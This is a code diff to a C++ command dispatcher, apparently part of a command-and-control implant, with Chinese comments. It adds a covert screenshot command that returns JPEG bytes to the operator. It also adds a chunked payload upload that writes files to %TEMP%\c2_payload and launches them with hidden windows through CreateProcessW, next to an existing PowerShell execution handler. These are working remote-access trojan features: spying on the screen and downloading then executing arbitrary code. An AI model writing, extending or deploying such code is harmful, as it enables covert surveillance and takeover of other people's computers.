@@ -2,6 +2,7 @@
 #include "cmd_dispatch.h"
 
 #include "protocol.h"
+#include "screen_spy.h"
 #include "screen_stream.h"
 
 #define WIN32_LEAN_AND_MEAN
@@ -288,6 +289,210 @@ namespace c2
         return output + tail;
     }
 
+    // ---------- 截屏（0x1001）：GDI 抓一帧 → WIC JPEG ----------
+
+    bool capture_screenshot_jpeg(std::vector<uint8_t>& out, uint8_t& status)
+    {
+        status = kStatusOK;
+        ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, 1.0f);
+        if (!spy)
+        {
+            status = kStatusPluginErrBase;
+            return false;
+        }
+        bool ok = spy->grab() &&
+            jpeg_encode_bgra(spy->width(), spy->height(), spy->stride(),
+                spy->pixels(), 75, out);
+        delete spy;
+        if (!ok || out.empty())
+        {
+            status = kStatusPluginErrBase;
+            return false;
+        }
+        return true;
+    }
+
+    // ---------- payload 分块上传与执行（0x3009，协议 §10）----------
+
+    uint16_t rd_u16(const uint8_t* p) { return (uint16_t)(p[0] | ((uint16_t)p[1] << 8)); }
+
+    uint32_t rd_u32(const uint8_t* p)
+    {
+        return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
+            ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
+    }
+
+    uint64_t rd_u64(const uint8_t* p)
+    {
+        uint64_t v = 0;
+        for (int i = 7; i >= 0; --i)
+            v = (v << 8) | p[i];
+        return v;
+    }
+
+    // 文件名白名单：仅允许单段文件名，拒绝路径分隔符与路径穿越
+    bool valid_payload_name(const std::string& n)
+    {
+        if (n.empty() || n.size() > kPayloadMaxNameLen)
+            return false;
+        if (n == "." || n == "..")
+            return false;
+        for (size_t i = 0; i < n.size(); ++i)
+        {
+            unsigned char c = (unsigned char)n[i];
+            if (c == '\\' || c == '/' || c == ':' || c < 0x20)
+                return false;
+        }
+        return true;
+    }
+
+    std::wstring utf8_to_wide(const std::string& s)
+    {
+        if (s.empty())
+            return std::wstring();
+        int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
+        if (n <= 0)
+            return std::wstring();
+        std::wstring w((size_t)n, 0);
+        MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
+        return w;
+    }
+
+    // payload 落盘目录（%TEMP% 下的 c2_payload）
+    std::wstring payload_dir()
+    {
+        wchar_t tmp[MAX_PATH] = { 0 };
+        DWORD n = GetTempPathW(MAX_PATH, tmp);
+        std::wstring d = (n > 0 && n < MAX_PATH) ? std::wstring(tmp, (size_t)n)
+            : std::wstring(L".\\");
+        if (!d.empty() && d[d.size() - 1] != L'\\')
+            d += L'\\';
+        d += L"c2_payload\\";
+        return d;
+    }
+
+    // 写入一块；末块（flags.bit0=1）写完后经 CreateProcess 启动（不等待退出）
+    std::string upload_and_maybe_exec(const uint8_t* payload, size_t len, uint8_t& status)
+    {
+        status = kStatusOK;
+        // 头固定部分：name_len(2)+args_len(2)+offset(8)+flags(1)+data_len(4) = 17
+        if (len < 17)
+        {
+            status = kStatusBadParam;
+            return "payload too short";
+        }
+        size_t off = 0;
+        uint16_t name_len = rd_u16(payload + off); off += 2;
+        if (name_len == 0 || len < off + (size_t)name_len + 2)
+        {
+            status = kStatusBadParam;
+            return "bad name length";
+        }
+        std::string name((const char*)payload + off, name_len); off += name_len;
+
+        uint16_t args_len = rd_u16(payload + off); off += 2;
+        if (len < off + (size_t)args_len + 8 + 1 + 4)
+        {
+            status = kStatusBadParam;
+            return "truncated header";
+        }
+        std::string args((const char*)payload + off, args_len); off += args_len;
+
+        uint64_t offset = rd_u64(payload + off); off += 8;
+        uint8_t flags = payload[off++];
+        uint32_t data_len = rd_u32(payload + off); off += 4;
+        if (data_len > kPayloadChunkSize || len < off + (size_t)data_len)
+        {
+            status = kStatusBadParam;
+            return "bad chunk size";
+        }
+        if (!valid_payload_name(name))
+        {
+            status = kStatusBadParam;
+            return "invalid payload name";
+        }
+        if (offset + data_len > (uint64_t)kPayloadMaxTotal)
+        {
+            status = kStatusBadParam;
+            return "payload exceeds size limit";
+        }
+
+        std::wstring dir = payload_dir();
+        CreateDirectoryW(dir.c_str(), nullptr);  // 已存在则失败，忽略
+        std::wstring wname = utf8_to_wide(name);
+        if (wname.empty())
+        {
+            status = kStatusBadParam;
+            return "bad payload name encoding";
+        }
+        std::wstring path = dir + wname;
+
+        HANDLE f = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, nullptr,
+            offset == 0 ? CREATE_ALWAYS : OPEN_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (f == INVALID_HANDLE_VALUE)
+        {
+            status = kStatusNoPermission;
+            return "open payload file failed (err=" + std::to_string(GetLastError()) + ")";
+        }
+        LARGE_INTEGER li;
+        li.QuadPart = (LONGLONG)offset;
+        SetFilePointerEx(f, li, nullptr, FILE_BEGIN);
+        DWORD written = 0;
+        BOOL wok = (data_len == 0) ? TRUE
+            : WriteFile(f, payload + off, data_len, &written, nullptr);
+        LARGE_INTEGER total;
+        total.QuadPart = 0;
+        GetFileSizeEx(f, &total);
+        CloseHandle(f);
+        if (!wok || written != data_len)
+        {
+            status = kStatusPluginErrBase;
+            return "write payload failed (err=" + std::to_string(GetLastError()) + ")";
+        }
+        if (total.QuadPart > (LONGLONG)kPayloadMaxTotal)
+        {
+            status = kStatusBadParam;
+            return "payload exceeds size limit";
+        }
+
+        std::string utf8path = WcharToUtf8(path.c_str());
+        std::string progress = "stored " + std::to_string(data_len) + " bytes at offset " +
+            std::to_string(offset) + " -> " + utf8path;
+
+        if (!(flags & kPayloadFlagLast))
+            return progress;  // 非末块：只确认写入
+
+        // 末块：启动 payload（不等待退出，不继承句柄）
+        std::wstring cmdline = L"\"" + path + L"\"";
+        if (!args.empty())
+        {
+            std::wstring wargs = utf8_to_wide(args);
+            if (!wargs.empty())
+            {
+                cmdline += L" ";
+                cmdline += wargs;
+            }
+        }
+        STARTUPINFOW si{};
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi{};
+        BOOL ok = CreateProcessW(nullptr, &cmdline[0], nullptr, nullptr, FALSE,
+            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+            nullptr, dir.c_str(), &si, &pi);
+        if (!ok)
+        {
+            status = kStatusPluginErrBase;
+            return progress + "\r\nCreateProcess failed (err=" +
+                std::to_string(GetLastError()) + ")";
+        }
+        DWORD pid = pi.dwProcessId;
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return progress + "\r\nexecuted pid=" + std::to_string(pid) +
+            " size=" + std::to_string((long long)total.QuadPart);
+    }
+
     bool handle_command(uint16_t cmd, const uint8_t* payload, size_t len,
         std::vector<uint8_t>& response, uint8_t& status)
     {
@@ -305,6 +510,22 @@ namespace c2
                 return true;
             }
             text = exec_powershell(std::string((const char*)payload, len), status);
+            break;
+        case kCmdScreenshot:
+        {
+            // 响应为 JPEG 原始字节（二进制，不经文本转换）
+            std::vector<uint8_t> jpeg;
+            if (!capture_screenshot_jpeg(jpeg, status))
+            {
+                text = "screenshot failed";
+                break;
+            }
+            response = std::move(jpeg);
+            return true;
+        }
+        case kCmdPayload:
+            // 分块写入 %TEMP%\c2_payload\；末块写完后启动并返回 pid
+            text = upload_and_maybe_exec(payload, len, status);
             break;
         case kCmdScreenStream:
         {
